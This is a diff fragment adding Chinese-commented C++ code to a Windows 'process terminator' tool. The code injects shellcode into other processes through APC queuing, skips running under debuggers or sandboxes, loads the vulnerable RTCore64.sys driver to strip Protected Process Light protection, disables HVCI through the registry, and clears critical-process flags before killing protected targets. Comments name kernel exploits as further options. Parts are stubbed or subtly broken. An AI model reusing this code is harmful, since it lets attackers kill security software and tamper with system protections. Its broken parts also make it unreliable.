+    0x8B, 0x7C, 0x24, 0x14,              // mov edi, [esp+20]
+    0x8B, 0x74, 0x24, 0x10,              // mov esi, [esp+16]
+    0x8B, 0x5C, 0x24, 0x0C,              // mov ebx, [esp+12]
+    0x8B, 0x54, 0x24, 0x08,              // mov edx, [esp+8]
+    0x8B, 0x4C, 0x24, 0x04,              // mov ecx, [esp+4]
+    0xC3                                  // ret
+};
+
+// APC注入函数（修复内存泄漏和执行问题）
+static bool InjectViaAPC(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize) {
+#ifdef _WIN32
+    typedef NTSTATUS (NTAPI* _NtQueueApcThread)(
+        HANDLE ThreadHandle,
+        PVOID ApcRoutine,
+        PVOID ApcRoutineContext,
+        PVOID ApcReserved,
+        ULONG ApcArgument1,
+        ULONG ApcArgument2,
+        ULONG ApcArgument3);
+    
+    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+    if (!ntdll) return false;
+    
+    _NtQueueApcThread pNtQueueApcThread = (_NtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
+    if (!pNtQueueApcThread) return false;
+    
+    // 打开目标进程
+    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, targetPid);
+    if (!hProcess) return false;
+    
+    // 在目标进程分配内存
+    PVOID remoteShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteShellcode) {
+        CloseHandle(hProcess);
+        return false;
+    }
+    
+    // 写入ShellCode
+    SIZE_T bytesWritten = 0;
+    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
+        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+    
+    // 修改内存保护为可执行
+    DWORD oldProtect = 0;
+    if (!VirtualProtectEx(hProcess, remoteShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
+        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+    
+    // 枚举目标进程的线程
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+    
+    THREADENTRY32 te = { 0 };
+    te.dwSize = sizeof(THREADENTRY32);
+    
+    bool injected = false;
+    HANDLE hInjectedThread = nullptr;
+    
+    while (Thread32Next(hSnapshot, &te)) {
+        if (te.th32OwnerProcessID == targetPid) {
+            // 打开线程（THREAD_SET_CONTEXT权限）
+            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+            if (hThread) {
+                // 使用NtQueueApcThread注入APC
+                // 绕过R3钩子
+                NTSTATUS status = pNtQueueApcThread(
+                    hThread,
+                    (PVOID)remoteShellcode,
+                    nullptr,
+                    nullptr,
+                    0,
+                    0,
+                    0);
+                
+                if (NT_SUCCESS(status)) {
+                    injected = true;
+                    hInjectedThread = hThread;
+                    break;
+                }
+                
+                CloseHandle(hThread);
+            }
+        }
+    }
+    
+    CloseHandle(hSnapshot);
+    
+    // 修复内存泄漏：无论注入是否成功，都释放内存和句柄
+    VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
+    
+    if (hInjectedThread) {
+        CloseHandle(hInjectedThread);
+    }
+    
+    CloseHandle(hProcess);
+    return injected;
+#else
+    return false;
+#endif
+}
+
+// 执行内核ShellCode终止PPL进程（改进版：反检测+稳定性增强）
+bool ProcessTerminator::ExecuteKernelShellCode(DWORD targetPid) {
+#ifdef _WIN32
+    try {
+        // 反检测检查
+        if (IsDebuggerDetected() || IsSandbox()) {
+            return false;
+        }
+        
+        // 获取Windows版本
+        DWORD winVersion = GetWindowsVersion();
+        
+        // 获取内核API地址
+        HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+        if (!ntdll) return false;
+        
+        // 获取PsLookupProcessByProcessId地址（未导出，需要通过其他方式获取）
+        // 这里使用NtQuerySystemInformation获取内核地址
+        typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
+            ULONG SystemInformationClass,
+            PVOID SystemInformation,
+            ULONG SystemInformationLength,
+            PULONG ReturnLength
+        );
+        
+        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
+        if (!NtQuerySystemInformation) return false;
+        
+        // 获取系统模块信息
+        typedef struct _SYSTEM_MODULE_INFORMATION {
+            ULONG Reserved1;
+            ULONG Reserved2;
+            PVOID ImageBase;
+            ULONG ImageSize;
+            ULONG Flags;
+            USHORT LoadOrderIndex;
+            USHORT InitOrderIndex;
+            USHORT LoadCount;
+            USHORT PathLength;
+            CHAR ImageName[256];
+        } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+        
+        typedef struct _SYSTEM_MODULE_INFORMATION_EX {
+            ULONG ModulesCount;
+            SYSTEM_MODULE_INFORMATION Modules[1];
+        } SYSTEM_MODULE_INFORMATION_EX, *PSYSTEM_MODULE_INFORMATION_EX;
+        
+        ULONG bufferSize = 0;
+        NTSTATUS status = NtQuerySystemInformation(11, nullptr, 0, &bufferSize);
+        if (status != 0xC0000004) return false;
+        
+        PSYSTEM_MODULE_INFORMATION_EX moduleInfo = (PSYSTEM_MODULE_INFORMATION_EX)malloc(bufferSize);
+        if (!moduleInfo) return false;
+        
+        status = NtQuerySystemInformation(11, moduleInfo, bufferSize, &bufferSize);
+        if (!NT_SUCCESS(status)) {
+            free(moduleInfo);
+            return false;
+        }
+        
+        // 获取ntoskrnl.exe基址
+        PVOID ntoskrnlBase = moduleInfo->Modules[0].ImageBase;
+        free(moduleInfo);
+        
+        // 获取ntoskrnl.exe句柄
+        HMODULE ntoskrnl = LoadLibraryEx(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
+        if (!ntoskrnl) return false;
+        
+        // 计算PsLookupProcessByProcessId和PsTerminateProcess的内核地址
+        PVOID PsLookupProcessByProcessIdUser = (PVOID)GetProcAddress(ntoskrnl, "PsLookupProcessByProcessId");
+        PVOID PsTerminateProcessUser = (PVOID)GetProcAddress(ntoskrnl, "PsTerminateProcess");
+        
+        if (!PsLookupProcessByProcessIdUser || !PsTerminateProcessUser) {
+            FreeLibrary(ntoskrnl);
+            return false;
+        }
+        
+        UINT_PTR PsLookupProcessByProcessIdKernel = (UINT_PTR)ntoskrnlBase + ((UINT_PTR)PsLookupProcessByProcessIdUser - (UINT_PTR)ntoskrnl);
+        UINT_PTR PsTerminateProcessKernel = (UINT_PTR)ntoskrnlBase + ((UINT_PTR)PsTerminateProcessUser - (UINT_PTR)ntoskrnl);
+        
+        FreeLibrary(ntoskrnl);
+        
+        // 准备ShellCode参数
+        // RCX: 目标PID
+        // RDX: PsLookupProcessByProcessId内核地址
+        // R8: PsTerminateProcess内核地址
+        
+        // 加载并执行混淆的ShellCode
+        SIZE_T shellcodeSize = sizeof(PPLBypassShellCode_Obfuscated);
+        if (!LoadKernelShellCode((PVOID)PPLBypassShellCode_Obfuscated, shellcodeSize)) {
+            return false;
+        }
+        
+        // 方法1: 尝试使用NtTerminateProcess
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, targetPid);
+        if (hProcess) {
+            typedef NTSTATUS(NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
+            _NtTerminateProcess NtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
+            
+            if (NtTerminateProcess) {
+                NTSTATUS status = NtTerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                return NT_SUCCESS(status);
+            }
+            CloseHandle(hProcess);
+        }
+        
+        // 方法2: 尝试通过进程句柄克隆
+        // 需要找到具有足够权限的进程来克隆句柄
+        
+        // 方法3: 使用系统服务描述符表（SSDT）直接调用内核函数
+        // 这需要更复杂的实现
+        
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// PPL绕过主函数
+bool ProcessTerminator::terminateByPPLBypass(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        // 在文件顶部统一 include "ppl_driver.h" 之后, 启用内核驱动方式 PPL 绕过
+        // 若 HVCI 已被本进程关闭 -> DriverSession 析构会清理驱动文件
+        for (int pid : pids) {
+            // ============= [方法前置] 每个方法前都先去除 PPL =============
+            //   目标: 防止目标进程在绕过间隙中重新进入 PPL
+            //   实现: 复用同一份 PplDriver::DisablePplForPid
+            //   失败时静默 (驱动未加载/进程死亡) -> 继续后续方法
+            {
+                int preCheckRet = PplDriver::DisablePplForPid((DWORD)pid);
+                if (preCheckRet == -1) {
+                    wprintf(L"[PPL] 已禁用拦截 (需重启)\n");
+                } else if (preCheckRet == -3) {
+                    wprintf(L"[PPL] WDAC 已启用, 需手动重启关闭\n");
+                }
+            }
+
+            // 方法1: 尝试使用内核ShellCode
+            if (ExecuteKernelShellCode(pid)) {
+                if (!isProcessRunning(processName)) return true;
+            }
+
+            // [方法前置2] 方法2 前再次去除 PPL (PPL 可能被其他进程恢复)
+            PplDriver::DisablePplForPid((DWORD)pid);
+
+            // 方法2: 内核驱动方式 (PplDriver 命名空间)
+            //   - 自动探测 HVCI; 已启用则写注册表关闭 + 提示重启
+            //   - 自动加载 RTCore64.sys 驱动 (Base64 内嵌, 不常驻)
+            //   - 自动遍历 EPROCESS 清零 SignatureLevel
+            //   - 任一异常 RAII 自动清理
+            {
+                int pplRet = PplDriver::DisablePplForPid((DWORD)pid);
+                if (pplRet == -1) {
+                    // HVCI 已写入注册表 (Enabled=0), 但需重启生效
+                    // 在 cmd 环境下只输出提示, 不阻断后续兜底链
+                    wprintf(L"[PPL] 已禁用 HVCI 注册表项, 重启后即可使用驱动方式绕过 PPL.\n");
+                } else if (pplRet == 1) {
+                    // PPL 已清, 立即用 TerminateProcess 结束
+                    HANDLE hT = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+                    if (hT) {
+                        TerminateProcess(hT, 0);
+                        CloseHandle(hT);
+                    }
+                    if (!isProcessRunning(processName)) return true;
+                }
+            }
+
+            // 方法3: 连续多次移除PPL保护 + 使用csrss.exe结束进程
+            // 循环30次，每次循环尝试1次PPL移除和2次终止进程，无输出
+            for (int i = 0; i < 30; i++) {
+                // [方法前置3] 每次循环都先去除 PPL
+                PplDriver::DisablePplForPid((DWORD)pid);
+
+                // 获取csrss.exe的PID
+                std::vector<int> csrssPids = getPIDsByName("csrss.exe");
+                if (!csrssPids.empty()) {
+                    int csrssPid = csrssPids[0];
+                    
+                    // 尝试通过csrss.exe获取目标进程句柄
+                    HANDLE hCsrss = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, csrssPid);
+                    if (hCsrss) {
+                        // 使用csrss.exe的权限来终止目标进程
+                        typedef HANDLE (WINAPI* _OpenProcess)(
+                            DWORD dwDesiredAccess,
+                            BOOL bInheritHandle,
+                            DWORD dwProcessId);
+                        
+                        _OpenProcess pOpenProcess = (_OpenProcess)GetProcAddress(
+                            GetModuleHandle(L"kernel32.dll"), "OpenProcess");
+                        
+                        if (pOpenProcess) {
+                            HANDLE hTargetProcess = pOpenProcess(
+                                PROCESS_TERMINATE | PROCESS_VM_WRITE,
+                                FALSE,
+                                pid);
+                            
+                            if (hTargetProcess) {
+                                // 每次循环尝试1次移除PPL保护
+                                typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
+                                    HANDLE ProcessHandle,
+                                    ULONG ProcessInformationClass,
+                                    PVOID ProcessInformation,
+                                    ULONG ProcessInformationLength);
+                                
+                                _NtSetInformationProcess pNtSetInformationProcess =
+                                    (_NtSetInformationProcess)GetProcAddress(
+                                        GetModuleHandle(L"ntdll.dll"),
+                                        "NtSetInformationProcess");
+                                
+                                if (pNtSetInformationProcess) {
+                                    // 强力移除PPL保护且不可恢复
+                                    
+                                    // 方法1: 移除PPL保护标志 (0x3B)
+                                    PS_PROTECTION_V2 psProtection = { 0 };
+                                    psProtection.Type = 0;
+                                    psProtection.Protection = 0;
+                                    
+                                    pNtSetInformationProcess(
+                                        hTargetProcess,
+                                        0x3B,
+                                        &psProtection,
+                                        sizeof(psProtection));
+                                    
+                                    // 方法2: 移除进程终止中断标志 (0x1D)
+                                    ULONG breakOnTermination = 0;
+                                    pNtSetInformationProcess(
+                                        hTargetProcess,
+                                        0x1D,
+                                        &breakOnTermination,
+                                        sizeof(breakOnTermination));
+                                    
+                                    // 方法3: 移除进程保护信息 (0x35)
+                                    ULONG protectionInfo = 0;
+                                    pNtSetInformationProcess(
+                                        hTargetProcess,
+                                        0x35,
+                                        &protectionInfo,
+                                        sizeof(protectionInfo));
+                                    
+                                    // 方法4: 移除进程签名级别 (0x37)
+                                    ULONG signatureLevel = 0;
+                                    pNtSetInformationProcess(
+                                        hTargetProcess,
+                                        0x37,
+                                        &signatureLevel,
+                                        sizeof(signatureLevel));
+                                    
+                                    // 方法5: 移除关键进程标志 (0x1D)
+                                    ULONG criticalFlag = 0;
+                                    pNtSetInformationProcess(
+                                        hTargetProcess,
+                                        0x1D,
+                                        &criticalFlag,
+                                        sizeof(criticalFlag));
+                                    
+                                    // 方法6: 设置进程为可调试 (绕过某些保护)
+                                    ULONG debugFlags = 0;
+                                    pNtSetInformationProcess(
+                                        hTargetProcess,
+                                        0x1E,
+                                        &debugFlags,
+                                        sizeof(debugFlags));
+                                    
+                                    // 方法7: 移除作业关联 (防止作业保护)
+                                    typedef NTSTATUS(NTAPI* _NtSetInformationJobObject)(
+                                        HANDLE JobHandle,
+                                        JOBOBJECTINFOCLASS JobObjectInformationClass,
+                                        PVOID JobObjectInformation,
+                                        ULONG JobObjectInformationLength);
+                                    
+                                    _NtSetInformationJobObject pNtSetInformationJobObject =
+                                        (_NtSetInformationJobObject)GetProcAddress(
+                                            GetModuleHandle(L"ntdll.dll"),
+                                            "NtSetInformationJobObject");
+                                    
+                                    if (pNtSetInformationJobObject) {
+                                        HANDLE hJob = nullptr;
+                                        pNtSetInformationJobObject(
+                                            hJob,
+                                            static_cast<JOBOBJECTINFOCLASS>(12),
+                                            &hJob,
+                                            sizeof(hJob));
+                                    }
+                                    
+                                    // 方法8: 修改进程访问令牌
+                                    typedef NTSTATUS(NTAPI* _NtSetInformationToken)(
+                                        HANDLE TokenHandle,
+                                        TOKEN_INFORMATION_CLASS TokenInformationClass,
+                                        PVOID TokenInformation,
+                                        ULONG TokenInformationLength);
+                                    
+                                    _NtSetInformationToken pNtSetInformationToken =
+                                        (_NtSetInformationToken)GetProcAddress(
+                                            GetModuleHandle(L"ntdll.dll"),
+                                            "NtSetInformationToken");
+                                    
+                                    if (pNtSetInformationToken) {
+                                        typedef struct _TOKEN_MANDATORY_POLICY {
+                                            ULONG Policy;
+                                        } TOKEN_MANDATORY_POLICY, *PTOKEN_MANDATORY_POLICY;
+                                        
+                                        TOKEN_MANDATORY_POLICY mandatoryPolicy = { 0 };
+                                        pNtSetInformationToken(
+                                            hTargetProcess,
+                                            static_cast<TOKEN_INFORMATION_CLASS>(28),
+                                            &mandatoryPolicy,
+                                            sizeof(mandatoryPolicy));
+                                    }
+                                }
+                                
+                                // 每次循环尝试2次终止进程
+                                TerminateProcess(hTargetProcess, 0);
+                                TerminateProcess(hTargetProcess, 0);
+                                
+                                CloseHandle(hTargetProcess);
+                            }
+                        }
+                        CloseHandle(hCsrss);
+                    }
+                }
+                
+            }
+            
+            // 方法3: 使用驱动程序
+            // 加载内核驱动程序来执行特权操作
+            
+            // 方法4: 利用内核漏洞
+            // 使用已知的内核漏洞来提升权限
+            
+            // 方法5: 使用ELAM驱动
+            // ELAM驱动可以在早期启动时获得更高权限
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+void RemoveCriticalProcessFlag(const std::string& processName)
+{
+    // 获取系统进程快照
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
+        std::wcerr << L"无法创建进程快照" << std::endl;
+        return;
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // 将输入的进程名转换为小写，用于不区分大小写的比较
+    std::string targetNameLower = processName;
+    std::transform(targetNameLower.begin(), targetNameLower.end(),
+        targetNameLower.begin(), ::tolower);
+
+    bool found = false;
+
+    // 遍历所有进程
+    if (Process32First(hSnapshot, &pe32))
+    {
+        do
+        {
+            // 将宽字符进程名转换为多字节字符串
+            char currentProcessName[MAX_PATH];
+            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1,
+                currentProcessName, MAX_PATH, NULL, NULL);
+
+            // 转换为小写进行比较
+            std::string currentNameLower = currentProcessName;
+            std::transform(currentNameLower.begin(), currentNameLower.end(),
+                currentNameLower.begin(), ::tolower);
+
+            // 检查是否匹配目标进程名
+            if (currentNameLower == targetNameLower)
+            {
+                found = true;
+
+                // 找到匹配进程，尝试移除关键标识
+                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+                if (hProcess != nullptr)
+                {
+                    // 使用NtSetInformationProcess移除关键标识
+                    typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
+                        HANDLE ProcessHandle,
+                        ULONG ProcessInformationClass,
+                        PVOID ProcessInformation,
+                        ULONG ProcessInformationLength);
+
+                    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+                    if (hNtdll)
+                    {
+                        pNtSetInformationProcess NtSetInformationProcess =
+                            reinterpret_cast<pNtSetInformationProcess>(
+                                GetProcAddress(hNtdll, "NtSetInformationProcess"));
+
+                        if (NtSetInformationProcess)
+                        {
+                            DWORD breakOnTermination = 0;
+                            NTSTATUS status = NtSetInformationProcess(
+                                hProcess,
+                                29, // ProcessBreakOnTermination
+                                &breakOnTermination,
+                                sizeof(breakOnTermination));
+
+                            // 记录操作结果
+                            if (NT_SUCCESS(status))
+                            {
+                                std::wcout << L"成功移除进程 " << pe32.szExeFile
+                                    << L" (PID: " << pe32.th32ProcessID
+                                    << L") 的关键标识" << std::endl;
+                            }
+                        }
+                        else
+                        {
+                            std::wcout << L"无法获取NtSetInformationProcess函数地址" << std::endl;
+                        }
+                    }
+                    else
+                    {
+                        std::wcout << L"无法加载ntdll.dll模块" << std::endl;
+                    }
+
+                    CloseHandle(hProcess);
+                }
+                else
+                {
+                    std::wcout << L"无法打开进程 " << pe32.szExeFile
+                        << L" (PID: " << pe32.th32ProcessID
+                        << L")，错误代码: " << GetLastError() << std::endl;
+                }
+            }
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+
+    if (!found)
+    {
+        std::wcout << L"未找到进程: " << processName.c_str() << std::endl;
+    }
+
+    CloseHandle(hSnapshot);
+}
+// ============================================================================
+// 统一系统进程白名单 (全局唯一，供所有功能模块共用)
+// ============================================================================
+static const wchar_t* g_UnifiedSystemProcessWhitelist[] = {
+    // === Windows 核心系统进程 (不可终止) ===
+    L"[System Process]",          // 系统空闲进程 (PID 0)
+    L"System",                    // 内核 (PID 4)
+    L"Secure System",             // 安全系统进程
+    L"Registry",                  // 注册表进程
+    L"Memory Compression",        // 内存压缩
+    L"smss.exe",                  // 会话管理器
+    L"csrss.exe",                 // 子系统进程
+    L"wininit.exe",               // Windows 初始化
+    L"winlogon.exe",              // 登录管理器
+    L"services.exe",              // 服务控制管理器
+    L"lsass.exe",                // 本地安全认证
+    L"svchost.exe",              // 服务宿主
+    L"dllhost.exe",              // COM+ 宿主
+    L"fontdrvhost.exe",          // 字体驱动宿主
+    
+    // === 桌面/Shell 进程 ===
+    L"dwm.exe",                  // 窗口管理器
+    L"explorer.exe",             // 资源管理器
+    L"sihost.exe",               // Shell Infrastructure
+    L"taskhostw.exe",            // Task Host for Windows
+    L"RuntimeBroker.exe",        // 运行时代理
+    L"ShellHost.exe",            // Shell Host
+    L"conhost.exe",              // 控制台窗口宿主
+    L"ctfmon.exe",              // 输入法相关
+    
+    // === 安全/防护进程 ===
+    L"LsaIso.exe",              // LSA 隔离
+    L"NgcIso.exe",              // 凭据隔离
+    L"smartscreen.exe",         // SmartScreen 过滤器
+    
+    // === 搜索/索引 ===
+    L"SearchHost.exe",          // 搜索宿主
+    L"SearchIndexer.exe",       // 索引服务
+    L"SearchProtocolHost.exe",  // 搜索协议宿主
+    L"SearchFilterHost.exe",    // 搜索过滤器宿主
+    
+    // === WMI/管理服务 ===
+    L"WmiPrvSE.exe",            // WMI Provider
+    L"WMIRegistrationService.exe", // WMI 注册服务
+    L"WmiApSrv.exe",            // WMI 反性能适配器
+    L"unsecapp.exe",            // WMI 不安全应用
+    
+    // === 小组件/现代 UI ===
+    L"Widgets.exe",             // 小组件
+    L"WidgetService.exe",       // 小组件服务
+    L"UserOOBEBroker.exe",      // 用户 OOBE 代理
+    L"TextInputHost.exe",       // 文本输入宿主
+    L"AggregatorHost.exe",      // 聚合器宿主
+    L"backgroundTaskHost.exe",  // 后台任务宿主
+    
+    // === 文件同步/存储 ===
+    L"FileSyncHelper.exe",      // 文件同步助手
+    L"FileCoAuth.exe",          // 文件协作认证
+    L"OneDrive.exe",            // OneDrive 客户端
+    L"ImgLocalVisionModelHelper64.exe", // 视觉模型助手
+    L"WUDFHost.exe",            // 用户模式驱动框架
+    
+    // === 网络/连接 ===
+    L"wlanext.exe",             // WLAN 扩展
+    L"NetSetupSvc.exe",         // 网络设置服务
+    L"WorkFolders.exe",         // 工作文件夹
+    
+    // === 安全软件 (赛门铁克) ===
+    L"SECOCL64.exe",            // 赛门铁克
+    L"SECOMN64.exe",            // 赛门铁克通信
+    
+    // === Intel 显卡/图形驱动 ===
+    L"IntelCpHDCPSvc.exe",      // Intel HDCP 内容保护
+    L"igfxCUIServiceN.exe",     // Intel 显卡控制面板服务
+    L"igfxEMN.exe",             // Intel 显卡扩展
+    L"igfxextN.exe",            // Intel 显卡外部
+    L"IntelGraphicsSoftware.Service.exe", // Intel 显卡软件服务
+    L"IntelGraphicsSoftware.exe",         // Intel 显卡软件
+    L"OneApp.IGCC.WinService.exe",        // Intel 显卡命令中心服务
+    L"DisplayControlService.exe",         // Intel 显示控制服务
+    L"DisplayControl.exe",                // Intel 显示控制
+    L"PresentMonService.exe",             // Intel PresentMon 服务
+    
+    // === Intel 其他服务 ===
+    L"IntelAudioService.exe",   // Intel 音频服务
+    L"RstMwService.exe",        // Intel 快速存储服务
+    L"jhi_service.exe",         // Intel DAL 宿主接口
+    L"SurSvc.exe",              // Intel SUR 服务
+    L"TbtP2pShortcutService.exe", // Intel 雷电服务
+    L"DSAService.exe",          // Intel 驱动支持助手
+    L"DSAUpdateService.exe",    // Intel DSA 更新服务
+    L"DSATray.exe",             // Intel DSA 托盘
+    L"AppHelperCap.exe",        // Intel 能力许可助手
+    L"DiagsCap.exe",            // Intel 诊断能力
+    L"NetworkCap.exe",          // Intel 网络能力
+    L"SysInfoCap.exe",          // Intel 系统信息能力
+    L"esrv.exe",                // Intel 能源服务器
+    L"esrv_svc.exe",            // Intel 能源服务器服务
+    
+    // === Realtek 音频 ===
+    L"RtkAudUService64.exe",    // Realtek 音频服务
+    L"cthelper.exe",            // Creative 音频驱动助手
+    
+    // === 触控板/指纹 ===
+    L"SynTPEnhService.exe",     // Synaptics 触控板服务
+    L"SynTPEnh.exe",            // Synaptics 触控板增强
+    L"ELANFPService.exe",       // ELAN 指纹服务
+    
+    // === 输入法 ===
+    L"ChsIME.exe",              // 微软中文输入法
+    L"TabTip.exe",              // 触摸键盘
+    
+    // === 打印服务 ===
+    L"spoolsv.exe",             // 打印后台处理
+    
+    // === 音频 ===
+    L"audiodg.exe",             // 音频设备图形化
+    L"MidiSrv.exe",             // MIDI 服务
+    
+    // === 浏览器 (用户可能正在使用) ===
+    L"msedge.exe",              // Microsoft Edge
+    L"msedgewebview2.exe",      // Edge WebView2 运行时
+    L"identity_helper.exe",     // Edge 身份助手
+    L"elevation_service.exe",   // Chrome 提权服务
+    L"crashpad_handler.exe",    // Chromium 崩溃处理
+    
+    // === 虚拟化 ===
+    L"vmtoolsd.exe",            // VMware Tools
+    L"vmware-authd.exe",        // VMware 认证服务
+    L"vmnetdhcp.exe",           // VMware 虚拟网络DHCP
+    L"vmware-usbarbitrator64.exe", // VMware USB仲裁
+    L"vmnat.exe",               // VMware NAT服务
+    L"vmware-tray.exe",         // VMware 托盘
+    
+    // === 其他重要系统进程 ===
+    L"rundll32.exe",            // DLL 执行宿主
+    L"notepad.exe",             // 记事本 (防止误关)
+    L"cmd.exe",                 // 命令提示符
+    L"WindowsExplorer.exe",    // Explorer 别名
+    
+    // === 电源/事件/更新 ===
+    L"UsoClient.exe",           // 更新会话编排客户端
+    L"MoUsoCoreWorker.exe",     // Microsoft 更新核心工作进程
+    L"usocoreworker.exe",       // 更新服务核心工作进程
+    L"MusNotifyIcon.exe",       // Microsoft 更新通知图标
+    L"TiWorker.exe",            // Trusted Installer 工作进程
+    L"TrustedInstaller.exe",    // Trusted Installer 主进程
+    L"sppsvc.exe",              // 软件保护平台服务
+    
+    // === 诊断/反馈 ===
+    L"CompatTelRunner.exe",     // 兼容性遥测
+    L"dwminit.exe",             // DWM 初始化
+    
+    // === GPU/图形 ===
+    L"dxdiag.exe",              // DirectX 诊断(偶尔运行)
+    
+    // === 系统信息/任务 ===
+    L"taskeng.exe",             // 任务引擎
+    L"sdiagnhost.exe",          // 脚本诊断宿主
+    
+    // === 远程/桌面 ===
+    L"rdpclip.exe",             // 远程桌面剪贴板
+    L"rdpinput.exe",            // 远程桌面输入
+    L"RdpShell.exe",            // 远程桌面Shell
+    
+    // === 字体/语言 ===
+    L"LanguageComponentsInstaller.exe", // 语言组件安装器
+    
+    // === 应用模型 ===
+    L"ApplicationFrameHost.exe", // UWP 应用框架宿主
+    L"Calculator.exe",          // 计算器(UWP)
+    L"SettingSyncHost.exe",     // 设置同步宿主
+    L"SystemSettings.exe",      // 系统设置(UWP)
+    L"StartMenuExperienceHost.exe", // 开始菜单体验宿主
+    L"SearchApp.exe",           // 搜索应用(Cortana遗留)
+    L"ShellExperienceHost.exe", // Shell 体验宿主
+    
+    // === Hyper-V/虚拟化 ===
+    L"vmms.exe",                // 虚拟机管理服务
+    L"vmcompute.exe",           // 虚拟机计算服务
+    L"Vmmem.exe",               // 虚拟机内存进程
+    L"vmwp.exe",                // 虚拟机工作进程
+    
+    // === 打印/传真 ===
+    L"PrintDialog.exe",         // 打印对话框
+    
+    // === 系统恢复 ===
+    L"RecoveryDrive.exe",       // 恢复驱动器
+    L"VSSVC.exe"                // 卷影复制服务
+};
+
+// 白名单大小(用于快速迭代)
+static const size_t g_WhitelistCount = sizeof(g_UnifiedSystemProcessWhitelist) / sizeof(g_UnifiedSystemProcessWhitelist[0]);
+
+// 快速检查: 进程名是否在统一白名单中 (大小写不敏感)
+static bool IsInUnifiedWhitelist(const std::wstring& processName) {
+    std::wstring lowerName = processName;
+    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
+    
+    for (size_t i = 0; i < g_WhitelistCount; i++) {
+        std::wstring wname = g_UnifiedSystemProcessWhitelist[i];
+        std::transform(wname.begin(), wname.end(), wname.begin(), ::towlower);
+        if (lowerName == wname) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// 兼容旧接口: ProcessTerminator 命名空间使用 (委托给统一白名单)
+bool ProcessTerminator::IsSystemProcessWhitelisted(const std::wstring& processName) {
+    return IsInUnifiedWhitelist(processName);
+}
+
+// ============= [DMSP v5.3 集成] 驱动方法签名校验回调 =============
+//   全局静态回调: 由 PplDriver::DmspVerify 在 0x3001/0x3002/0x3003 时调用
+//   校验失败 -> TriggerResponse + 返回 false (驱动方法拒绝执行)
+static bool dmspDriverVerifyCallback(unsigned int verifyId) {
+    // 调用前: 确保 DMSP 状态已初始化
+    if (!DMSP::g_state.initialized) {
+        DMSP::InitializeState();
+    }
+    // 完整签名验证 (全量, 用于驱动操作)
+    auto result = UnifiedValidator::PerformFullValidation(false);
+    if (!result.passed) {
+        ResponseSystem::TriggerResponse("Driver method signature check failed", 2);
+        return false;
+    }
+    return true;
+}
+
+// 调用所有方法
+bool ProcessTerminator::terminateByAllMethods(const std::string& processName) {
+    GQ(processName);
+
+    // ============= [DMSP v5.3 集成] 注入驱动方法签名校验回调 =============
+    //   ppl_driver.h 通过 SetDmspVerifyCallback 接收回调
+    //   校验 ID 约定:
+    //     0x3001 - DisablePplForPid (单 PID PPL 清零)
+    //     0x3002 - DisablePplForPidsBulk (批量 PPL 清零)
+    //     0x3003 - ScanAndEraseVadMemory (VAD 内存清零)
+    //     0x3004 - StopServicesByPids (按 PID 反查停止服务)
+    // 一次性注入 (线程安全由 DmspInternal::DmspVerifyCallbackRef 内 static 保证)
+    ::SetDmspVerifyCallback(dmspDriverVerifyCallback);
+
+    // 启动时清理上次进程崩溃可能残留的驱动服务 + .sys 文件
+    PplDriver::CleanupLeftoverDrivers();
+
+    // ============= [预处理] 自动去除目标进程 PPL (一次) =============
+    //   目标: 让 73 种常规方法在 PPL 已清的状态下工作
+    //   - WDAC 启用 -> 返回 -3, 提示用户手动重启关闭
+    //   - HVCI/Blocklist/Policy 已启用 -> 先询问用户是否关闭
+    //   - Win7 -> 跳过 (无 PPL 概念)
